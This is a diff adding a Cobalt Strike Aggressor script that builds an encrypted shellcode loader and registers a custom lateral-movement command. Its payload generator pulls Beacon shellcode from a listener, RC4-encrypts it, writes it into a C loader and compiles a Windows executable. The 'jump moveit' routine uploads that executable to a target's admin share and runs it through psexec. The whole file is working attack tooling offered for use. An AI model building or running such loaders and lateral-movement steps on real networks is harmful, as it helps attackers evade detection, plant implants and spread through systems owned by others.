@@ -1,0 +1,163 @@
+# My custom OpsLoader Payload Generator
+# by Agent007
+# I heavily referenced these resources. Show them some love:
+    # https://github.com/Workingdaturah/Payload-Generator
+    # https://hstechdocs.helpsystems.com/manuals/cobaltstrike/current/userguide/content/topics_aggressor-scripts/as-resources_functions.htm <- Huge list of functions to help me customize
+
+$teamserver = "/home/ee/Tools/CobaltStrike/Server/"; # <-- SET THE LOCATION CONTAINING THE TEAMSERVER BINARY AND OpsPG FOLDER HERE
+
+
+#######################################
+
+#   Generate Payload Menu Bar Below   #
+
+#######################################
+
+menubar("OpsLoader", "generate"); # Creates a menu bar at the top
+popup generate {                # When clicked more buttons appear
+	item "Generate OpsLoader" {  genPayloadMenu();  }  # Item 1 button that appears, creates pop up when clicked.
+};
+
+
+# Create a function that makes a pop up submenu for generating payloads with differnet options you can select
+sub genPayloadMenu {
+
+	# Create a dialog. Use &dialog_show to show it. Args in Order: 1. Title of the dialog; 2. A %dictionary mapping row names to default values; 3.A callback function that gets called when the user presses a &dbutton_action button.
+	# $1 is a reference to the dialog. $2 is the button name. $3 is a dictionary that maps each row's name to its value.
+	$dialog = dialog("OpsLoader Payload Generator", %(listener => "Select Listener: ", Exe_name => "OpsLoader"), &genPayload); 
+	
+	# Adds a description to a &dialog
+	dialog_description($dialog, "Creates an x64 exe using OpsLoader & Beacon shellcode");
+	
+	# Adds a listener selection row to a &dialog. This row only shows listeners with stagers (e.g., windows/beacon_https/reverse_https).
+	drow_listener($dialog, "listener", "Listener: ");     
+
+	# Adds a text field row to a &dialog
+	drow_text($dialog, "Exe_name", "Executable Name: "); 
+	
+	# Adds an action button to a &dialog. When this button is pressed, the dialog closes and its callback is called.
+	dbutton_action($dialog, "Generate");
+	
+	# Shows a &dialog.
+	dialog_show($dialog);
+}
+
+
+# Callback function that gets called when you click Generate.
+sub genPayload {
+	# check if user is on a linux or windows box
+	
+	##### Copy Pasta from WorkingDaturah #####
+	global('$TEMPDIR');
+	$TEMPDIR = cwd() . "/payloads/";
+	mkdir(cwd(). "/payloads/");
+	if (substr(cwd(), 0, 1) eq "/") {
+		$os = "linux";
+	} else {
+		$os = "windows";
+		$TEMPDIR = strrep($TEMPDIR, "/", "\\");
+	}
+	##########################################
+	
+	
+	$filename = $3['Exe_name']; 
+
+	# Listener needs to be selected
+	if ($3['listener'] ismatch "Select Listener: ") {
+		berror($1, 'You did not select a Listener.');
+		show_message("Please select a Listener.");
+	}
+	
+	# generate raw shellcode # I need to change to this to have more listeners
+	$rawShellcode = payload($3['listener'], "x64", "process", "Indirect");  
+	
+        $shellcodebin = openf(">" . $teamserver . "OpsPG/tmploader/in.bin");
+        writeb($shellcodebin, $rawShellcode);
+        closef($shellcodebin);
+        
+	$runrc4 = exec("python3 " . $teamserver . "OpsPG/rc4encrypt.py " . $teamserver . "OpsPG/tmploader/in.bin " . $teamserver . "OpsPG/tmploader/out.bin \x31");
+	
+	$encryptedFile = openf("" . $teamserver . "OpsPG/tmploader/out.bin");
+	$encryptedShellcode = readb($encryptedFile, -1);
+	@fmt = str_chunk(transform($encryptedShellcode, "hex"), 2);
+	$payload_string = "\\x" . join("\\x", @fmt);
+	closef($encryptedFile);
+
+	
+	
+	# [original file] [new file]
+	$in = openf("" . $teamserver . "OpsPG/baseloader/OpsLoader/main.c");
+	$data = readb($in, -1);
+
+	$out = openf(">" . $teamserver . "OpsPG/tmploader/main.c");
+	$newdata = strrep($data, "%%DATA%%", $payload_string);      
+	writeb($out, $newdata);
+
+	closef($in);
+	closef($out);
+	
+	
+	
+	# Compile the temporary loader
+	if ($os eq "windows") {
+		printf("Not done with this yet");
+	}
+	else if ($os eq "linux") {
+		# set variables
+		$command = "x86_64-w64-mingw32-gcc " . $teamserver . "OpsPG/tmploader/main.c -o " . $filename . ".exe -lshlwapi -Os";
+		$path = $teamserver . "OpsPG";
+		# compile binary
+		$process = exec($command, $null, $path);
+		@data = readAll($process);
+		closef($process);
+	}
+	
+	show_message("Your payload has been generated at " . $path . "/" . $filename . ".exe");
+}
+
+
+######################################
+
+#   Lateral Movement Command Below   #
+
+######################################
+
+sub invoke_moveit # create a function named invoke_moveit
+{
+    # Initialize variables
+    $targetlocation = "\\\\ $+ $2 $+ \\C$\\Windows\\Temp\\OpsLoader.exe";
+
+    # When the command is ran, acknowledge
+    btask($1, "Tasked Beacon to run " . listener_describe($3) . " on $2 via MoveIt", "T1021");
+    
+    # Pass desired listener and hardcoded name for the newly generated payload
+    %passin['listener'] = $3;
+    %passin['Exe_name'] = "OpsLoader";
+    genPayload("arg1", "arg2", %passin);
+    
+    # Upload the specified binary to the target
+    $OpsPGHandle = openf("" . $teamserver . "OpsPG/OpsLoader.exe");
+    $OpsPGData = readb($OpsPGHandle, -1);
+    closef($OpsPGHandle);
+    bupload_raw($1, $targetlocation, $OpsPGData);
+    
+    # Run the binary on the remote target
+    bremote_exec($1, "psexec", $2, "cmd.exe /c start C:\\Windows\\Temp\\OpsLoader.exe");
+
+    # This function links to an SMB or TCP listener. If the specified listener is not an SMB or TCP listener, this function does nothing.
+    beacon_link($1, $2, $3);
+}
+
+# Register a new technique in the jump command which executes the invoke_moveit function
+beacon_remote_exploit_register("moveit", "x64", "Automatically upload and execute a specified binary.", &invoke_moveit);
+
+# Register a new help command. Type "help jump moveit".
+beacon_command_register(
+   "jump moveit", 
+   "Lateral Movement with MoveIt", 
+   "Syntax: jump moveit [target] [listener]");
+
+# - $0 is the command to run (moveit)
+# - $1 is the Beacon ID.
+# - $2 is the target to jump to.
+# - $3 is the listener
